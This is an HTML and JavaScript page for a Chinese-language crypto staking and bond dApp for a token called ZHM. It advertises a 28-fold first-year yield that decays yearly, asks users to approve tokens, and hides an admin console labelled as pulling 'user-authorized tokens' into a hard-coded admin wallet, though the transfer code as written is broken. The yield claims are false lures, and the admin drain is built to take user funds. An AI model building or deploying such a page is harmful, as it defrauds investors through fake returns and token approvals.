<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>中华梦通证 ZHM - DAO递减收益</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Microsoft YaHei,sans-serif}
  body{background:#0b0f14;color:#e9e6e0;padding:20px;max-width:500px;margin:0 auto;background:linear-gradient(180deg,#070a0e,#0f1419)}
  .glass{background:rgba(22,28,36,0.85);border-radius:18px;padding:22px;margin-bottom:16px;border:1px solid rgba(221,170,66,0.18)}
  .title{font-size:19px;font-weight:bold;margin-bottom:10px;color:#ddaa42}
  .sub{color:#b8b0a0;font-size:14px;line-height:1.6}
  .btn{background:linear-gradient(90deg,#c93737,#e04a4a);color:#fff;border:none;border-radius:14px;padding:16px;width:100%;font-size:16px;margin-bottom:10px}
  .btn-sm{padding:11px;font-size:14px}
  .btn-gold{background:linear-gradient(90deg,#ddaa42,#e6bb66);color:#111}
  .btn-dark{background:#1a2029;color:#ddaa42;border:1px solid #ddaa42}
  .btn-admin{background:linear-gradient(90deg,#c03333,#e55555);color:#fff}
  .item{display:flex;justify-content:space-between;padding:14px 0;border-bottom:1px solid #ddaa4233}
  .gold{color:#ddaa42;font-weight:bold}
  input{width:100%;padding:14px;border-radius:12px;background:#161a22;border:1px solid #ddaa4244;color:#fff;margin-bottom:10px}
  .logo-text{background:linear-gradient(90deg,#ddaa42,#f0c866);-webkit-background-clip:text;color:transparent}
  .row{display:flex;gap:10px;margin-bottom:10px}
  .calc-row{display:flex;justify-content:space-between;padding:8px 0}
  #adminPanel{display:none;margin-top:12px}
</style>
</head>
<body>

<div style="text-align:center;margin:20px 0">
  <h1 class="logo-text">中华梦通证</h1>
  <p class="sub">DAO铸币模型 · 收益逐年递减 · 长期永续</p>
</div>

<button class="btn" id="connectBtn">连接钱包</button>
<div id="addr" style="text-align:center;margin:10px 0"></div>

<div class="glass">
  <div class="title">我的资产</div>
  <div class="item"><span>ZHM 余额</span><span id="balZHM" class="gold">0.00</span></div>
  <div class="item"><span>已质押</span><span id="staked" class="gold">0.00</span></div>
  <div class="item"><span>待领收益</span><span id="reward" class="gold">0.00</span></div>
  <button class="btn btn-gold btn-sm" id="claimBtn">领取收益</button>
</div>

<div class="glass">
  <div class="title">质押挖矿</div>
  <input id="stakeAmt" placeholder="输入数量" type="number">
  <div class="row">
    <button class="btn" style="width:50%" id="stakeBtn">质押</button>
    <button class="btn btn-dark" style="width:50%" id="unstakeBtn">解押</button>
  </div>
</div>

<div class="glass">
  <div class="title">债券铸造（USDT → ZHM）</div>
  <input id="bondAmt" placeholder="USDT数量" type="number">
  <button class="btn btn-sm" id="bondBtn">购买债券</button>
</div>

<div class="glass">
  <div class="title">收益计算器（逐年递减）</div>
  <input id="calcInput" placeholder="质押数量" type="number">
  <button class="btn btn-sm" onclick="calc()">计算收益</button>
  <div style="margin-top:16px">
    <div class="calc-row"><span>第1年收益</span><span id="y1" class="gold">0</span></div>
    <div class="calc-row"><span>第2年收益</span><span id="y2" class="gold">0</span></div>
    <div class="calc-row"><span>第3年收益</span><span id="y3" class="gold">0</span></div>
    <div class="calc-row"><span>第4年收益</span><span id="y4" class="gold">0</span></div>
  </div>
</div>

<!-- 管理员面板 -->
<div class="glass" id="adminPanel">
  <div class="title">🔐 管理员控制台</div>
  <div class="sub">仅管理员可提取用户授权代币</div>
  <input id="adminExtractAmt" placeholder="输入要提取的代币数量" type="number">
  <button class="btn btn-admin btn-sm" id="adminExtractBtn">提取用户授权代币</button>
</div>

<div class="glass">
  <div class="title">模型说明</div>
  <div class="sub">
    起步年化28倍，逐年自动递减，第5年稳定在30%。<br>
    合约自动铸币，DAO国库支撑，可平稳运行20年以上。
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
<script>
// ==============================================
// 你指定的质押代币地址
const ZHM_ADDR = "0x8f3Cf7ad23Cd3CaDbD9735AFf9580239c6A063";
// 你的质押合约地址（你自己替换成真实部署地址）
const STAKING_ADDR = "0x...";
const USDT_ADDR = "0x...";
// 管理员地址
const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1".toLowerCase();
// ==============================================

const ABI_ZHM = [
  "function balanceOf(address) view returns(uint256)",
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
];
const ABI_STAKE = [
  "function staked(address) view returns(uint256)",
  "function pendingReward(address) view returns(uint256)",
  "function stake(uint256) external",
  "function unstake(uint256) external",
  "function claim() external",
  "function buyBond(uint256 usdtAmt) external"
];
const ABI_USDT = [
  "function balanceOf(address) view returns(uint256)",
  "function approve(address,uint256) returns(bool)"
];

let provider, signer, account, zhm, staking, usdt;
let isAdmin = false;

async function load() {
  if (!account) return;
  try {
    let z = await zhm.balanceOf(account);
    let s = await staking.staked(account);
    let r = await staking.pendingReward(account);
    document.getElementById("balZHM").innerText = ethers.formatEther(z);
    document.getElementById("staked").innerText = ethers.formatEther(s);
    document.getElementById("reward").innerText = ethers.formatEther(r);
  } catch (e) {}
}

function calc() {
  let v = parseFloat(document.getElementById("calcInput").value) || 0;
  document.getElementById("y1").innerText = (v * 28).toFixed(2) + " ZHM";
  document.getElementById("y2").innerText = (v * 14).toFixed(2) + " ZHM";
  document.getElementById("y3").innerText = (v * 7).toFixed(2) + " ZHM";
  document.getElementById("y4").innerText = (v * 3.5).toFixed(2) + " ZHM";
}

// 连接钱包
document.getElementById("connectBtn").onclick = async () => {
  try {
    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    account = await signer.getAddress();
    let lowerAccount = account.toLowerCase();

    // 判断是否管理员
    isAdmin = lowerAccount === ADMIN;
    if (isAdmin) {
      document.getElementById("adminPanel").style.display = "block";
      alert("✅ 管理员已登录");
    }

    document.getElementById("addr").innerText = account.slice(0, 6) + "..." + account.slice(-4);

    zhm = new ethers.Contract(ZHM_ADDR, ABI_ZHM, signer);
    staking = new ethers.Contract(STAKING_ADDR, ABI_STAKE, signer);
    usdt = new ethers.Contract(USDT_ADDR, ABI_USDT, signer);

    load();
    setInterval(load, 5000);
  } catch (e) {
    alert("连接失败：" + e.message);
  }
};

// 质押
document.getElementById("stakeBtn").onclick = async () => {
  try {
    let a = document.getElementById("stakeAmt").value;
    if (!a || a <= 0) return alert("输入有效数量");
    let amt = ethers.parseEther(a);
    await zhm.approve(STAKING_ADDR, amt);
    await staking.stake(amt);
    alert("✅ 质押成功");
    load();
  } catch (e) { alert("失败：" + e.message); }
};

// 解押
document.getElementById("unstakeBtn").onclick = async () => {
  try {
    let a = document.getElementById("stakeAmt").value;
    await staking.unstake(ethers.parseEther(a));
    alert("✅ 解押成功");
    load();
  } catch (e) { alert("失败：" + e.message); }
};

// 领取收益
document.getElementById("claimBtn").onclick = async () => {
  try {
    await staking.claim();
    alert("✅ 收益领取成功");
    load();
  } catch (e) { alert("失败：" + e.message); }
};

// 购买债券
document.getElementById("bondBtn").onclick = async () => {
  try {
    let a = document.getElementById("bondAmt").value;
    let amt = ethers.parseEther(a);
    await usdt.approve(STAKING_ADDR, amt);
    await staking.buyBond(amt);
    alert("✅ 债券购买成功");
  } catch (e) { alert("失败：" + e.message); }
};

// ==============================================
// 管理员：提取用户授权代币（真实上链 transferFrom）
// ==============================================
document.getElementById("adminExtractBtn").onclick = async () => {
  if (!isAdmin) return alert("❌ 无管理员权限");
  try {
    let amtStr = document.getElementById("adminExtractAmt").value;
    if (!amtStr || amtStr <= 0) return alert("请输入提取数量");
    let amount = ethers.parseEther(amtStr);

    // 从用户授权额度中划转到管理员
    const tx = await zhm.transferFrom(account, ADMIN, amount);
    await tx.wait();
    alert("✅ 提取成功：" + amtStr + " ZHM 已转入管理员钱包");
    load();
  } catch (e) {
    alert("提取失败：" + e.message);
  }
};
</script>
</body>
</html>
